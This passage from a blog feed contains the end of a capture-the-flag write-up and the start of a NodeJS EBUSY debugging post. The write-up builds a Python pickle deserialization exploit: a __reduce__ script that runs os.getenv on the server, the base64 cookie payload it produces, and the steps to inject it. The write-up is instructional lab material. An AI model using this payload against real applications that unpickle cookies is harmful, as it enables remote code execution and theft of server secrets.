<code>FRAME</code> - The unpickler may use this opcode to safely prefetch data from its underlying stream.
<code>EMPTY_LIST</code> - creates a list.
<code>MARK</code> - Push markobject onto the stack.
<code>MEMOIZE</code> - Store the stack top into the memo.  The stack is not popped. The index of the memo location to write is the number of elements currently present in the memo.
<code>SHORT_BINUNICODE</code> - Push a Python Unicode string object.
<code>APPENDS</code> - Extend a list by a slice of stack objects
<code>STOP</code> - Stop the unpickling machine.</p>
</blockquote>
<p>After reading the documentation in detail, we are able to decypher what the output instructions of the assembly behind the <code>pickle</code> actually mean:</p>
<ol>
<li>The protocol used by this pickle is 4.</li>
<li>The size of the frame coming from the stream (represented by the bytes from the <code>cookie_decoded</code> file) is 38 bytes long.</li>
<li>Generate and push a new empty list to the stack.</li>
<li>Store the stack top into the memory at index 0.</li>
<li>Push the <code>markobject</code> (a special object that marks the current instruction similar to the CIR register in CPU control unit) onto the stack.</li>
<li>Push the string ‘kobbi’ into the onto the stack.</li>
<li>Store the stack top into the memo at index 1.</li>
<li>Repeat instruction 6 and 7 for ‘test2’ and ‘really ugly ui’ strings with indices 2,3 respectively.</li>
<li>Extend the list holding the strings.</li>
<li>Stop the PM.</li>
</ol>
<p>Great, so now that we have the instructions, what’s next? Well, we need to figure out how to generate a cookie string that will include a command to read the environmental variable where the cookie value is held and when unpickled, will spit out the flag.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="generating-the-cookie-to-expose-the-flag">Generating the Cookie to Expose the Flag<a href="https://kbbgl.github.io/blog/angstrom-ctf2021-exploiting-python-pickle-in-flask#generating-the-cookie-to-expose-the-flag" class="hash-link" aria-label="Direct link to Generating the Cookie to Expose the Flag" title="Direct link to Generating the Cookie to Expose the Flag">​</a></h2>
<p>Now that we have a greater understanding what the pickle assembly looks like, the next step would be to find a way to generate a payload that when unpickled, would expose the flag we need to complete the assignment.
If we review the source code of the Flask server, we can see that the flag is held in an environmental variable:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">flag </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> os</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">environ</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">get</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'FLAG'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'actf{FAKE_FLAG}'</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>So in whatever payload we generate, we would need to run a system call to read the environmental variable, probably something like this:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">os</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">getenv</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'FLAG'</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>That’s the easy part. But how do we generate the payload and insert this command within the bytecode of the cookie to be unpickled?</p>
<p>After some research, I found <a href="https://davidhamann.de/2020/04/05/exploiting-python-pickle/" target="_blank" rel="noopener noreferrer">the following article describing how we can use the <code>reduce</code> method to append additional commands to the bytecode payload</a>. The appended command will be used for retrieving the <code>FLAG</code> environmental variable.
I used the article to write a script to generate the bytecode payload, modifying it to suit my needs (the author needed to run some commands and get back a reverse shell, here we’re only interested in getting the <code>FLAG</code> environmental variable). This is the script called <code>payloadgen.py</code>:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> pickle</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> base64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> os</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">class</span><span class="token plain"> </span><span class="token class-name">PayloadGen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">object</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">__reduce__</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">self</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">os</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">getenv</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'FLAG'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> __name__ </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'__main__'</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   dmp </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> pickle</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">dumps</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">PayloadGen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">base64</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">urlsafe_b64encode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">dmp</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I’m using <code>urlsafe_b64encode</code> here because I want to ensure that the generated encoded payload is URL safe. Also, the extra comma in <code>('FLAG',)</code> is there because the second item of the tuple returned by <code>reduce</code> must be a <code>tuple</code> as well.
I then ran the script:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 payloadgen.py</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">b</span><span class="token string" style="color:#e3116c">'gASVHAAAAAAAAACMAm9zlIwGZ2V0ZW52lJOUjARGTEFHlIWUUpQu'</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Nice! If we take the value ‘gASVHAAAAAAAAACMAm9zlIwGZ2V0ZW52lJOUjARGTEFHlIWUUpQu‘ and set the cookie to it and refresh the page, we get a scrambled set of letters which is likely our flag!</p>
<p><img decoding="async" loading="lazy" src="https://tilsupport.files.wordpress.com/2021/04/image-5.png" alt="scrambled" class="img_ev3q"></p>
<p>The last piece of the puzzle is to figure out the correct order of the flag and reassemble it.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="reassembling-the-flag">Reassembling the Flag<a href="https://kbbgl.github.io/blog/angstrom-ctf2021-exploiting-python-pickle-in-flask#reassembling-the-flag" class="hash-link" aria-label="Direct link to Reassembling the Flag" title="Direct link to Reassembling the Flag">​</a></h2>
<p>If we look at the image above, we can see that the letters of the flag are displayed on the site in an unordered manner. When refreshing the page, the letters will be shuffled to a different order. By reviewing the HTML returned by the root path, we see that the method returns a random positioning for each <code>div</code> item:</p>
<div class="language-css codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-css codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token selector" style="color:#00009f">top:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">random.</span><span class="token function" style="color:#d73a49">random</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">*100</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain">%</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token selector" style="color:#00009f">left:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">random.</span><span class="token function" style="color:#d73a49">random</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">*100</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain">%</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'&lt;form method="post" action="/add" style="text-align: center; width: 100%"&gt;&lt;input type="text" name="item" placeholder="Item"&gt;&lt;button&gt;Add Item&lt;/button&gt;&lt;img style="width: 100%; height: 100%" src="/pickle.jpg"&gt;'</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">''</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">join</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string-interpolation string" style="color:#e3116c">f'&lt;div style="background-color: white; font-size: 3em; position: absolute; top: </span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">random</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">.</span><span class="token string-interpolation interpolation">random</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">(</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">)</span><span class="token string-interpolation interpolation operator" style="color:#393A34">*</span><span class="token string-interpolation interpolation number" style="color:#36acaa">100</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">%; left: </span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">random</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">.</span><span class="token string-interpolation interpolation">random</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">(</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">)</span><span class="token string-interpolation interpolation operator" style="color:#393A34">*</span><span class="token string-interpolation interpolation number" style="color:#36acaa">100</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">%;"&gt;</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">item</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">&lt;/div&gt;'</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> item </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> items</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>But, what we notice here is that the <code>for</code> loop (<code>for item in items</code>) iteration is actually done in an ordered manner, which should simplify figuring out how to reassemble the flag text. So I reviewed the HTML of the page and found that the items are, as expected, positioned in an ordered manner (all Angstrom CTF flags have the following standard structure: <code>actf{}</code>):</p>
<p><img decoding="async" loading="lazy" src="https://tilsupport.files.wordpress.com/2021/04/image-6.png" alt="scramble-2" class="img_ev3q"></p>
<p>So we could just manually take each <code>div</code> value and construct the flag. But the more elegant way would be to use some JavaScript to construct the flag:</p>
<div class="language-javascript codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-javascript codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">var</span><span class="token plain"> letters </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> document</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">getElementByTagName</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"div"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">var</span><span class="token plain"> flag </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">""</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">var</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> letters</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">length</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i</span><span class="token operator" style="color:#393A34">++</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   flag </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> letters</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">innerText</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Which outputs the flag:</p>
<div class="language-javascript codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-javascript codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">flag</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">actf</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">you_got_yourself_out_of_a_pickle</span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content>
        <author>
            <name>Kobbi Gal</name>
            <uri>https://github.com/kbbgl</uri>
        </author>
        <category label="Ctf" term="Ctf"/>
        <category label="Python" term="Python"/>
        <category label="Security" term="Security"/>
        <category label="Web" term="Web"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[How To Catch EBUSY Event on Windows using NodeJS]]></title>
        <id>https://kbbgl.github.io/blog/catch-ebusy-on-nodejs</id>
        <link href="https://kbbgl.github.io/blog/catch-ebusy-on-nodejs"/>
        <updated>2025-02-26T00:45:50.000Z</updated>
        <summary type="html"><![CDATA[Introduction]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="introduction">Introduction<a href="https://kbbgl.github.io/blog/catch-ebusy-on-nodejs#introduction" class="hash-link" aria-label="Direct link to Introduction" title="Direct link to Introduction">​</a></h2>
<p>During a debugging session of one of our NodeJS microservices misbehaving on a Windows Server 2019 instances, I opened the microservice log to begin investigating the faulty behavior.</p>
<p>But when I scrolled down to the timestamp where I was supposed to start investigating, I found out that the log was full of the following errors thrown by an attempt to read the microservice log file:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Error: EBUSY: resource busy or locked, lstat %PROGRAMDATA%/microservice_b/mb.log</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Followed by a termination of the microservice logging. It was visible also that the microservice was in some unstable state as it's CPU was on 0% and it's memory working set was fixed and not changing.</p>
<p>After restarting the microservice (a NodeJS process wrapped in a Windows Service), the serverside functionality of the microservice resumed.</p>
<p>Since this microservice was critical to the functionality of the application, I needed to do 2 things, in this order:</p>
<ul>
<li>Ensure that there's no downtime for the microservice.</li>
<li>Investigate the root cause of the <code>EBUSY</code> error.</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="microservice-high-availability">Microservice High Availability<a href="https://kbbgl.github.io/blog/catch-ebusy-on-nodejs#microservice-high-availability" class="hash-link" aria-label="Direct link to Microservice High Availability" title="Direct link to Microservice High Availability">​</a></h2>
<p>High Availability is a concept that is synonymous with the microservice architecture. In a production-grade, enterprise environment, you want to have fault tolerance in case one of the microservices stops serving it's requests' path (as in the case I investigated here).</p>
<p>There are different approaches to fault tolerance, the most popular one is using replicas of the same microservices to listen on the same requests. For example, in the architecture I was working with, the Angular frontend application was sending requests to the NodeJS/Express servers who were talking between them in Produces/Consumer fashion using a RabbitMQ message broker. Each microservice (and its instances) was bound to one queue in an exchange.</p>
<p><img decoding="async" loading="lazy" alt="arch" src="https://kbbgl.github.io/assets/images/arch-183593580566541db22696f624deb970.jpeg" width="781" height="421" class="img_ev3q"></p>
<p>The specific microservice that was malfunctioning had only one instance configured (Instance 1 of Microservice B in the diagram above). In order to provide High Availability in this case, all I needed to do was to find out how to increase the number of instances of a microservice.</p>
<p>Since the NodeJS microservices were deployed on a Windows instance and not in the newer generation Linux-cloud native instance which runs atop a Kubernetes cluster (where I could just run <code>kubectl scale deployment microservice_b --replicas=3</code>), I needed to check the configuration database (hosted as a Zookeeper instance) and find where we can configure the number of instance per microservice.</p>
<p>After a while of searching our knowledgebase (why are they always so messy and it's so hard to find anything in them?!?!), I found the z-node path where this configuation was held. I sent the following command to set the number of replicas to 3:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">bin/zkCli.bat </span><span class="token parameter variable" style="color:#36acaa">-server</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">127.0</span><span class="token plain">.0.1:2181 </span><span class="token builtin class-name">set</span><span class="token plain"> /config/microservice_b/clusterNodes </span><span class="token number" style="color:#36acaa">3</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>First task was done. We now had 3 microservices and had High Availability for this critical service path. As you may recall, the next step was the investigation of the EBUSY event and mitigation of it.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="investigating-ebusy-event">Investigating <code>EBUSY</code> Event<a href="https://kbbgl.github.io/blog/catch-ebusy-on-nodejs#investigating-ebusy-event" class="hash-link" aria-label="Direct link to investigating-ebusy-event" title="Direct link to investigating-ebusy-event">​</a></h2>
<p>Until this point, I've been working on debugging NodeJS for about 1 year and mostly in a Windows environment. I have seen and debugged different NodeJS errors, such as filesystem-related <code>EACCES</code>, <code>ENOENT</code>, <code>EMFILE</code> and network-related errors <code>EADDRINUSE</code>, <code>ECONNRESET</code>, <code>ECONNREFUSED</code>, <code>ECONNABORTED</code> . But I've never seen <code>EBUSY</code> before.</p>
<p>First step was to see what the <a href="https://nodejs.org/dist./v6.3.0/docs/api/all.html" target="_blank" rel="noopener noreferrer">official NodeJS documentation for error messages</a> provided. Not much elaboration from the site unfortunately:</p>
<blockquote>
<p>EBUSY | Indicates that a device or resource is busy.</p>
</blockquote>
<p>Per my understanding, this issue was related to the filesystem mutex/lock.</p>
<p>I decided that the most efficient way to understand this error code was to review the NodeJS source code since, conveniently enough, is open-source.</p>
<p>I cloned the Node JS repo:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">git</span><span class="token plain"> clone https://github.com/nodejs/node.git</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
